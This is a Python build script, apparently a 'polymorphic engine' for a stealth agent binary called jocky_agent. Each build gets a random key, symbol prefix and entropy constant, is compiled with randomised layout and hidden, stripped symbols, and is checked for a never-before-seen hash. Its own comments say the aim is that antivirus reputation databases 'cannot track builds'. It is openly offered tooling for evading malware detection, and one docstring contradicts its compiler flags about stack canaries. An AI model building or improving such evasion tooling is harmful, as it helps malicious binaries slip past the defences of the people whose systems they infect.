# ── Colour output ──────────────────────────────────────────────────
def red(s):    return f"\033[91m{s}\033[0m"
def green(s):  return f"\033[92m{s}\033[0m"
def yellow(s): return f"\033[93m{s}\033[0m"
def cyan(s):   return f"\033[96m{s}\033[0m"
def bold(s):   return f"\033[1m{s}\033[0m"

def log(stage, msg):
    print(f"  [{cyan(stage)}] {msg}")

def ok(msg):
    print(f"  [{green('PASS')}] {msg}")

def fail(msg):
    print(f"  [{red('FAIL')}] {msg}")
    sys.exit(1)


# ══════════════════════════════════════════════════════════════════
# STAGE 1 — Generate per-build unique identity
# ══════════════════════════════════════════════════════════════════

def generate_build_identity():
    """
    Creates a unique identity for this build:
    - Build ID  (UUID)
    - Build key (random AES-256 key)
    - Build timestamp
    - Randomised symbol prefix (makes symbols look different each build)
    """
    build_id  = uuid.uuid4().hex
    build_key = secrets.token_hex(32)   # 256-bit AES key
    build_ts  = int(time.time())
    # Random 6-char prefix for symbol obfuscation
    sym_prefix = secrets.token_hex(3)   # e.g. "a3f9b2"

    identity = {
        "build_id":   build_id,
        "build_key":  build_key,
        "build_ts":   build_ts,
        "sym_prefix": sym_prefix,
    }

    log("IDENTITY", f"build_id   = {build_id}")
    log("IDENTITY", f"build_key  = {build_key[:16]}...  (AES-256, per-build)")
    log("IDENTITY", f"sym_prefix = {sym_prefix}  (symbol obfuscation)")
    return identity


# ══════════════════════════════════════════════════════════════════
# STAGE 2 — Inject build identity into source
# Creates a modified copy of the source with unique constants
# ══════════════════════════════════════════════════════════════════

IDENTITY_HEADER_TEMPLATE = """\
/*
 * jocky_build_identity.h  — AUTO-GENERATED, DO NOT EDIT
 * Generated by poly_engine.py — unique per build
 *
 * Every build has different values here.
 * This ensures:
 *   - Different binary content every compile
 *   - Different SHA256 hash every build
 *   - AV file-reputation database cannot track builds
 */
#ifndef JOCKY_BUILD_IDENTITY_H
#define JOCKY_BUILD_IDENTITY_H

/* Unique build identifier */
#define JOCKY_BUILD_ID       "{build_id}"

/* Per-build AES-256 key (hex encoded) */
#define JOCKY_BUILD_KEY      "{build_key}"

/* Build timestamp */
#define JOCKY_BUILD_TS       {build_ts}UL

/* Symbol prefix — changes function name prefix each build */
#define JOCKY_SYM_PREFIX     "{sym_prefix}"

/* Compile-time entropy constant — forces unique .text section */
static const unsigned long long JOCKY_ENTROPY =
    0x{entropy}ULL;

#endif /* JOCKY_BUILD_IDENTITY_H */
"""

def inject_identity(build_dir, identity):
    """
    Writes a unique header file into the build directory.
    This header is included by the runtime — ensuring every
    compiled binary has different bytes in the .text section.
    """
    entropy = secrets.token_hex(8)  # 64-bit random constant

    header = IDENTITY_HEADER_TEMPLATE.format(
        build_id  = identity["build_id"],
        build_key = identity["build_key"],
        build_ts  = identity["build_ts"],
        sym_prefix = identity["sym_prefix"],
        entropy   = entropy,
    )

    header_path = os.path.join(build_dir, "jocky_build_identity.h")
    with open(header_path, "w") as f:
        f.write(header)

    log("INJECT", f"identity header written → {header_path}")
    log("INJECT", f"entropy constant = 0x{entropy}")
    return header_path


# ══════════════════════════════════════════════════════════════════
# STAGE 3 — Compile with obfuscation flags
# ══════════════════════════════════════════════════════════════════

def compile_stealth_runtime(src_dir, build_dir, identity):
    """
    Compiles the stealth runtime with:
    - Randomised optimisation seed (-frandom-seed)
    - Stack canaries disabled (reduces predictable padding)
    - Position-independent code
    - Debug info stripped
    - Symbol visibility hidden
    """
    # Source files
    stealth_c = os.path.join(src_dir,   "jocky_runtime_linux_stealth.c")
    syscall_h = os.path.join(src_dir,   "jocky_syscall_linux.h")
    test_c    = os.path.join(src_dir,   "test_stealth.c")
    out_bin   = os.path.join(build_dir, "jocky_agent")

    if not os.path.exists(stealth_c):
        fail(f"Source not found: {stealth_c}")

    # Copy sources into build dir so they can include the identity header
    shutil.copy(stealth_c, build_dir)
    if os.path.exists(syscall_h):
        shutil.copy(syscall_h, build_dir)
    # test_stealth.c lives in runtime/ (same as src_dir)
    if os.path.exists(test_c):
        shutil.copy(test_c, build_dir)
    else:
        fail(f"Build smoke-test source not found: {test_c}\n"
             f"Expected at: {test_c}")

    build_stealth = os.path.join(build_dir, "jocky_runtime_linux_stealth.c")
    build_test    = os.path.join(build_dir, "test_stealth.c")

    # Randomised seed makes compiler emit slightly different code layout
    rand_seed = identity["build_id"][:16]

    cmd = [
        "gcc",
        "-O2",
        "-DJOCKY_STEALTH",
        f"-DJOCKY_BUILD_ID=\"{identity['build_id']}\"",
        f"-frandom-seed={rand_seed}",   # different code layout each build
        "-fvisibility=hidden",           # hide symbols from export table
        "-fstack-protector-all",
        "-fpic",                         # position independent
        "-s",                            # strip symbols at link time
        "-I", build_dir,                 # find identity header
        "-o", out_bin,
        build_test,
        build_stealth,
    ]

    log("COMPILE", "gcc " + " ".join(cmd[1:6]) + " ...")
    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode != 0:
        fail(f"Compile failed:\n{result.stderr}")

    ok(f"Binary compiled → {out_bin}")
    return out_bin


# ══════════════════════════════════════════════════════════════════
# STAGE 4 — Strip and verify uniqueness
# ══════════════════════════════════════════════════════════════════

def strip_and_hash(binary_path, build_dir):
    """
    Strips any remaining debug symbols.
    Computes SHA256 of the final binary.
    Saves hash to a manifest file.
    """
    # Additional strip pass
    subprocess.run(["strip", "--strip-all", binary_path],
                   capture_output=True)

    # Compute SHA256
    sha = hashlib.sha256()
    with open(binary_path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            sha.update(chunk)
    digest = sha.hexdigest()

    size = os.path.getsize(binary_path)

    log("HASH", f"SHA256 = {digest}")
    log("HASH", f"Size   = {size:,} bytes")

    # Save manifest
    manifest = {
        "binary":    os.path.basename(binary_path),
        "sha256":    digest,
        "size":      size,
        "timestamp": int(time.time()),
    }
    manifest_path = os.path.join(build_dir, "build_manifest.json")
    with open(manifest_path, "w") as f:
        json.dump(manifest, f, indent=2)

    ok(f"Manifest saved → {manifest_path}")
    return digest


# ══════════════════════════════════════════════════════════════════
# STAGE 5 — Compare against previous build
# Proves polymorphism is working
# ══════════════════════════════════════════════════════════════════

def verify_uniqueness(digest, history_path):
    """
    Checks that this build's hash has never been seen before.
    Saves hash to history file.
    This PROVES every build is unique.
    """
    history = []
    if os.path.exists(history_path):
        with open(history_path) as f:
            try:
                history = json.load(f)
            except Exception:
                history = []

    if digest in history:
        fail(f"HASH COLLISION — binary is NOT unique! Polymorphic engine failed.")

    history.append(digest)
    with open(history_path, "w") as f:
        json.dump(history, f, indent=2)

    ok(f"Hash is UNIQUE — not seen in {len(history)-1} previous builds")
    log("POLY", f"Total unique builds recorded: {len(history)}")


